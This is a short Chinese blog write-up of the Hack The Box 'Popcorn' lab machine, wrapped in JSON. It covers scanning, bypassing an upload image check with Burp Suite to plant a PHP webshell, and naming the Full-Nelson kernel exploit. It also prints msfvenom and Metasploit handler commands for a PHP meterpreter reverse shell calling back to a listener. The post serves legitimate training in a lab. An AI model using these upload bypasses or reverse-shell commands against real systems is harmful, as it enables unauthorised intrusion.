{"title":"Hack The Box Popcorn","date":"2019-05-17T01:34:52.000Z","slug":"Hack-The-Box-Popcorn","updated":"2019-05-17T05:24:28.046Z","content":"<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>Hack The Box是一个渗透的靶机环境，只需要10欧元就可以玩退休的机器了，当然是买买买了。每一周回开放20个靶机供我们渗透。</p>\n<h3 id=\"渗透\"><a href=\"#渗透\" class=\"headerlink\" title=\"渗透\"></a>渗透</h3><p>nmap扫描改靶机，结果如下：<br><img src=\"/img/nmap.png\" alt=\"我是图片\"><br>发现80端口是开着的，用dirbuster扫一遍，结果发现有个torrent目录<br><img src=\"/img/torrent.png\" alt=\"我是图片\"><br>打开改url发现是个可以上传的共享文件网站，注册后登陆，上传一个种子之后发现还可以上传wallpaper.<br><img src=\"/img/wallpaper.png\" alt=\"我是图片\"></p>\n<p>这里应该可以上传一句话木马，发现可以利用burpsuite过掉图片的验证。<br><img src=\"/img/burpsuite.png\" alt=\"我是图片\"><br>上传成功！发现可以在/upload目录下获取到该一句话木马。<br><img src=\"/img/success.png\" alt=\"我是图片\">。<br>直接上菜刀。<br><img src=\"/img/caidao.png\" alt=\"我是图片\">。</p>\n<p>这里的提权可以使用Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - ‘Full-Nelson.c’ Local Privilege Escalation该exp。利用python -m SimpleHTTPServer上传该exp。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw</span><br><span class=\"line\"></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload php/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 10.10.14.3</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 4321</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>结果如下：</p>\n<p><img src=\"/img/getroot.png\" alt=\"我是图片\">。</p>\n","next":{"title":"看雪ctf第一赛季部分题目writeup","slug":"看雪ctf第一赛季部分题目writeup"},"link":"https://foyjog.github.io/post/Hack-The-Box-Popcorn/"}